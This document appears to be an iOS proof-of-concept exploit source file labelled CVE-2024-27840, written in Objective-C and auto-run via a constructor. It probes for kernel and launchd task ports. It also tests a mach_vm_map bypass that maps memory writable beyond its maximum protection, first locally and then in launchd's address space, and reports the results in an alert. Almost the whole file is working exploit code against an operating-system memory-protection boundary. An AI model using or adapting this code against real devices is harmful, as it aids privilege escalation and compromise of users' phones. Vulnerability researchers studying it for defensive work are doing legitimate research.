@import UIKit;
#import <mach/mach.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/sysctl.h>
#include <spawn.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t,
    int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);

static sigjmp_buf jbuf;
static volatile sig_atomic_t fault_sig = 0;
static void handler(int s) { fault_sig = s; siglongjmp(jbuf, 1); }

static void show_alert(NSString *title, NSString *msg) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIViewController *vc = nil;
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if ([scene isKindOfClass:[UIWindowScene class]]) {
                for (UIWindow *w in ((UIWindowScene *)scene).windows)
                    if (w.isKeyWindow) { vc = w.rootViewController; break; }
                if (vc) break;
            }
        }
        if (!vc) { NSLog(@"[CVE27840] NO VC: %@", msg); return; }
        if (vc.presentedViewController)
            [vc.presentedViewController dismissViewControllerAnimated:NO completion:nil];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 500*NSEC_PER_MSEC), dispatch_get_main_queue(), ^{
            UIAlertController *a = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            [vc presentViewController:a animated:YES completion:nil];
        });
    });
}

static NSString *run_test(void) {
    NSMutableString *r = [NSMutableString string];
    kern_return_t kr;
    mach_port_t self_task = mach_task_self();

    char hw[64]={0}; size_t hl=sizeof(hw);
    sysctlbyname("hw.machine", hw, &hl, NULL, 0);
    char bld[64]={0}; size_t bl=sizeof(bld);
    sysctlbyname("kern.osversion", bld, &bl, NULL, 0);
    [r appendFormat:@"%s iOS %@ (%s)\npid %d %s\n",
        hw, [[UIDevice currentDevice] systemVersion], bld, getpid(), getprogname()];

    // ── Phase 1: Probe what Coruna unlocked ──
    [r appendString:@"\n── Probing primitives ──\n"];

    // Try task_for_pid on various targets
    int tfp_targets[] = { 0, 1, getpid() };
    const char *tfp_names[] = { "kernel(0)", "launchd(1)", "self" };
    mach_port_t tfp_ports[3] = {};

    for (int i = 0; i < 3; i++) {
        kr = task_for_pid(self_task, tfp_targets[i], &tfp_ports[i]);
        [r appendFormat:@"task_for_pid(%s): %s\n", tfp_names[i],
            kr == 0 ? "OK" : mach_error_string(kr)];
    }

    // Try host_get_special_port(4) = kernel task port
    mach_port_t host = mach_host_self();
    mach_port_t hsp4 = MACH_PORT_NULL;
    kr = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
    [r appendFormat:@"host_special_port(4): %s\n",
        kr == 0 && hsp4 != MACH_PORT_NULL ? "OK" : "unavailable"];

    // ── Phase 2: Local cur>max (proven, for baseline) ──
    [r appendString:@"\n── Local cur>max ──\n"];
    mach_vm_size_t psz = vm_page_size;
    mach_vm_address_t src = 0;
    kr = mach_vm_allocate(self_task, &src, psz, VM_FLAGS_ANYWHERE);
    if (kr) { [r appendString:@"alloc fail\n"]; return r; }
    memset((void*)src, 'A', psz);

    memory_object_size_t esz = psz;
    mach_port_t entry = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(self_task, &esz, src, VM_PROT_READ|VM_PROT_WRITE, &entry, MACH_PORT_NULL);
    if (kr) { [r appendString:@"entry fail\n"]; mach_vm_deallocate(self_task,src,psz); return r; }

    mach_vm_address_t vuln = 0;
    kr = mach_vm_map(self_task, &vuln, psz, 0, VM_FLAGS_ANYWHERE, entry, 0, FALSE,
                     VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ, VM_INHERIT_NONE);
    if (kr) { [r appendFormat:@"map REJECTED: %s\nPATCHED\n", mach_error_string(kr)]; return r; }

    struct sigaction sa={0},ob={0},os={0}; sa.sa_handler=handler; sigemptyset(&sa.sa_mask);
    sigaction(SIGBUS,&sa,&ob); sigaction(SIGSEGV,&sa,&os);
    fault_sig=0; int wok=0; char rb=0;
    if (sigsetjmp(jbuf,1)==0) {
        // Write pattern
        memset((void*)vuln, 'Z', 64);
        rb = *(volatile char*)src;
        wok=1;
    }
    sigaction(SIGBUS,&ob,NULL); sigaction(SIGSEGV,&os,NULL);

    if (wok && rb=='Z') {
        // Verify 64 bytes all match
        int match = memcmp((void*)src, (void*)vuln, 64) == 0;
        [r appendFormat:@"WRITE 64 bytes: OK\nsrc='%c' match=%s\n", rb, match?"YES":"NO"];
        [r appendString:@"cur>max CONFIRMED\n"];
    } else if (wok) {
        [r appendFormat:@"WRITE OK but src='%c' (CoW)\n", rb];
    } else {
        [r appendFormat:@"WRITE FAULT sig=%d\n", fault_sig];
    }

    // ── Phase 3: Cross-process if available ──
    if (tfp_ports[1] != MACH_PORT_NULL) {
        // We got launchd's task port!
        [r appendString:@"\n── Cross-process (launchd) ──\n"];

        // Try to read launchd's memory as proof
        uint64_t read_buf = 0;
        mach_vm_size_t read_sz = 8;
        // Read launchd's mach_task_self region (header of Mach-O)
        kr = mach_vm_read_overwrite(tfp_ports[1], 0x100000000ULL, 8, (mach_vm_address_t)&read_buf, &read_sz);
        if (kr == 0) {
            [r appendFormat:@"Read launchd @0x100000000: %#llx\n", read_buf];
            if ((read_buf & 0xFFFFFFFF) == 0xFEEDFACF) {
                [r appendString:@"Mach-O header confirmed!\n"];
            }

            // Now try cur>max map into launchd's address space
            mach_vm_address_t ld_page = 0;
            kr = mach_vm_map(tfp_ports[1], &ld_page, psz, 0, VM_FLAGS_ANYWHERE,
                             entry, 0, FALSE,
                             VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ, VM_INHERIT_NONE);
            [r appendFormat:@"map(launchd,cur=RW,max=R): %s\n",
                kr==0 ? "OK — CROSS-PROCESS BYPASS" : mach_error_string(kr)];
            if (kr == 0) {
                [r appendFormat:@"addr in launchd: %#llx\n", (uint64_t)ld_page];
                [r appendString:@"\n*** CROSS-PROCESS cur>max ***\n"];
                [r appendString:@"*** CONFIRMED ***\n"];
                mach_vm_deallocate(tfp_ports[1], ld_page, psz);
            }
        } else {
            [r appendFormat:@"Read launchd: %s\n", mach_error_string(kr)];
        }
    }

    // Cleanup
    mach_vm_deallocate(self_task, vuln, psz);
    mach_port_deallocate(self_task, entry);
    mach_vm_deallocate(self_task, src, psz);
    for (int i = 0; i < 3; i++)
        if (tfp_ports[i]) mach_port_deallocate(self_task, tfp_ports[i]);
    if (hsp4) mach_port_deallocate(self_task, hsp4);

    return r;
}

static void do_test(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        NSString *r = run_test();
        NSLog(@"[CVE27840]\n%@", r);
        show_alert(@"CVE-2024-27840", r);
    });
}

__attribute__((constructor)) static void ctor(void) { do_test(); }
int start(void)  { return 0; }
int startl(void) { return 0; }
int startm(void) { return 0; }
int startr(void) { return 0; }
